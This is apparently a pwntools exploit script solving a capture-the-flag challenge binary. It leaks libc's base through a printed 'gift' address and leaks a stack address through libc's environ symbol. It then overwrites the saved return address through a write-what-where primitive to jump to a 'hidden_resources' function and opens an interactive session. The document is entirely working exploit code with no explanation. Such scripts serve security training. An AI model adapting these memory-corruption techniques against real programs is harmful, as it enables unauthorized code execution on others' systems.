#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings
import re

# Set up pwntools for the correct architecture
exe = context.binary = ELF('environment_patched')
libc = exe.libc
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

filterwarnings("ignore")
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *plant+227
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================


def init():
    global io

    io = start()


def leak_libc():
    for _ in range(5):
        io.recvuntil(">")
        io.sendline("2")
        io.recvuntil(">")
        io.sendline("1")
        io.recvuntil(">")
        io.sendline("n")

    io.recvuntil("gift:")
    res = io.recvline()
    leak = re.findall(rb"0x[0-9a-zA-Z]+" , res)
    libc.address = int(leak[0], 16) - libc.sym['printf']
    info("libc base: %#x", libc.address)


def leak_mem():
    for _ in range(5):
        io.recvuntil(">")
        io.sendline("2")
        io.recvuntil(">")
        io.sendline("1")
        io.recvuntil(">")
        io.sendline("n")

    io.sendline(str(libc.sym["environ"]))
    io.recvuntil("want.\n")
    stack_leak = u64(io.recvline()[6:12].ljust(8, b'\x00'))
    saved_rip = stack_leak - 0x120
    info("stack leak: %#x", stack_leak)
    info("saved rip: %#x", saved_rip)
    return saved_rip


def www(stack_leak):
    win = exe.sym["hidden_resources"]

    io.recvuntil(">")
    io.sendline("1")
    io.sendline(str(stack_leak))
    io.sendline(str(win))


def solve():

    leak_libc()
    leak = leak_mem()
    www(leak)

    io.interactive()



def main():
    
    init()
    solve()



if __name__ == '__main__':
    main()

